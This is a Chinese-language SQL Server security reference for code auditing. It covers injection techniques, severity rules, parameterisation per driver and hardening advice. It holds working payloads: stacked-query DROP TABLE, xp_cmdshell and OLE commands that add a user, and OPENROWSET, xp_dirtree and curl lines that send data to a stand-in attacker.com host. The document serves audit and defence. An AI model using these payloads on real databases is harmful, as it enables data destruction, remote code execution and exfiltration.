# Microsoft SQL Server — 引擎特异性知识

---

## 1. 注入特有技法

### 1.1 Stacked Queries（堆叠查询）

MSSQL **默认支持**在单次请求中执行多条 SQL 语句（分号分隔），这是其与 MySQL/PostgreSQL 的最大安全差异。

```sql
-- 攻击者输入: '; DROP TABLE users; --
-- 实际执行:
SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
-- 两条语句都会被执行
```

**影响**：任何 SQL 注入点在 MSSQL 上都可能执行任意语句（INSERT/UPDATE/DELETE/DROP/EXEC 等），严重性自动上调。

### 1.2 xp_cmdshell（操作系统命令执行）

```sql
-- 启用 xp_cmdshell（需要 sysadmin 权限）
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 执行操作系统命令
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ss /add';
```

**影响**：SQL 注入 → RCE（远程代码执行）。即使 xp_cmdshell 默认禁用，拥有 sysadmin 权限的注入可以重新启用它。

### 1.3 OLE Automation

```sql
-- 当 xp_cmdshell 被禁用时的替代 RCE 方式
DECLARE @obj INT;
EXEC sp_OACreate 'WScript.Shell', @obj OUTPUT;
EXEC sp_OAMethod @obj, 'Run', NULL, 'cmd /c whoami > C:\temp\out.txt';
```

### 1.4 OPENROWSET / OPENDATASOURCE（数据外带）

```sql
-- 通过 OPENROWSET 将数据发送到攻击者控制的服务器
SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=attacker.com;uid=sa;pwd=pass', 'SELECT 1');

-- 读取本地文件
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS data;
```

### 1.5 信息收集

```sql
-- 版本信息
SELECT @@VERSION;
SELECT SERVERPROPERTY('ProductVersion');

-- 当前数据库
SELECT DB_NAME();

-- 所有数据库
SELECT name FROM master.sys.databases;

-- 当前用户和权限
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- 表和列枚举
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';
```

### 1.6 布尔盲注 / 时间盲注

```sql
-- 布尔盲注
' AND (SELECT COUNT(*) FROM sys.tables WHERE name='users') > 0 --

-- 时间盲注
'; WAITFOR DELAY '0:0:5' --
'; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '0:0:5' --
```

### 1.7 错误型注入

```sql
-- 通过类型转换错误泄露数据
' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users)) --
' AND 1=CAST((SELECT @@version) AS int) --
```

---

## 2. 严重性修正因子

| 条件 | 修正 |
|------|------|
| 确认注入点存在 | **上调至 🔴 高危**（默认支持 stacked queries） |
| 数据库用户为 sysadmin / sa | **上调至 🔴 高危 + 标注 RCE 风险**（xp_cmdshell） |
| xp_cmdshell 已启用 | **上调至 🔴 高危 + 标注 RCE 已确认** |
| 应用使用低权限 DB 账户（仅 SELECT） | 维持基础等级（但 stacked queries 仍可读取其他库） |
| 使用 Windows 身份认证 + 服务账户 | 额外标注：RCE 后继承服务账户的 Windows 权限 |

### 审计时附加检查项

1. **检查连接字符串中的用户**：是否使用 `sa` 或 sysadmin 角色用户
2. **检查应用程序数据库角色**：`db_owner` 以上即可启用高危功能
3. **检查 `TRUSTWORTHY` 设置**：`SELECT is_trustworthy_on FROM sys.databases`

---

## 3. 数据外带（Out-of-Band）方法

| 方法 | 命令 | 前提条件 |
|------|------|----------|
| DNS | `EXEC master..xp_dirtree '\\attacker.com\share'` | 网络可出站 |
| HTTP (xp_cmdshell) | `EXEC xp_cmdshell 'curl attacker.com/?data=...'` | xp_cmdshell 已启用 |
| SMB | `SELECT * FROM OPENROWSET(...)` 到 UNC 路径 | OPENROWSET 已启用 |
| 文件写入 | `EXEC xp_cmdshell 'bcp "..." queryout "C:\..."'` | 写入权限 |

---

## 4. MSSQL 特有占位符与参数化

### 4.1 各语言/驱动的参数化方式

| 语言/驱动 | 占位符 | 示例 |
|---|---|---|
| ADO.NET (C#) | `@name` | `WHERE name = @name` + `cmd.Parameters.AddWithValue("@name", val)` |
| Dapper (C#) | `@name` | `new { name = val }` |
| node-mssql | `@name` | `request.input('name', val)` |
| tedious | `@P1` | `Request` 对象绑定 |
| pyodbc | `?` | `cursor.execute("... WHERE name = ?", val)` |
| JDBC | `?` | `PreparedStatement.setString(1, val)` |
| Go (go-mssqldb) | `@p1` | `db.Query("... WHERE name = @p1", val)` |

### 4.2 存储过程的安全陷阱

```sql
-- 即使使用存储过程，内部拼接仍然危险
CREATE PROCEDURE sp_SearchUsers @name NVARCHAR(100)
AS
BEGIN
    -- 🔴 危险：动态 SQL 拼接
    EXEC('SELECT * FROM users WHERE name = ''' + @name + '''');

    -- ✅ 安全：sp_executesql 参数化
    EXEC sp_executesql
        N'SELECT * FROM users WHERE name = @n',
        N'@n NVARCHAR(100)',
        @n = @name;
END
```

**审计要求**：即使代码层使用参数化调用存储过程，仍需审查存储过程内部的 SQL 构建方式。

---

## 5. 防御建议

1. **最小权限**：应用数据库账户仅授予必要的表级 SELECT/INSERT/UPDATE/DELETE，禁止 sysadmin/db_owner
2. **禁用高危功能**：生产环境确保 `xp_cmdshell`、`OLE Automation`、`OPENROWSET` 处于禁用状态
3. **使用 `sp_executesql`**：当必须使用动态 SQL 时，用 `sp_executesql` 替代 `EXEC()`
4. **网络隔离**：数据库服务器不应能直接访问外网（阻断 OOB 外带）
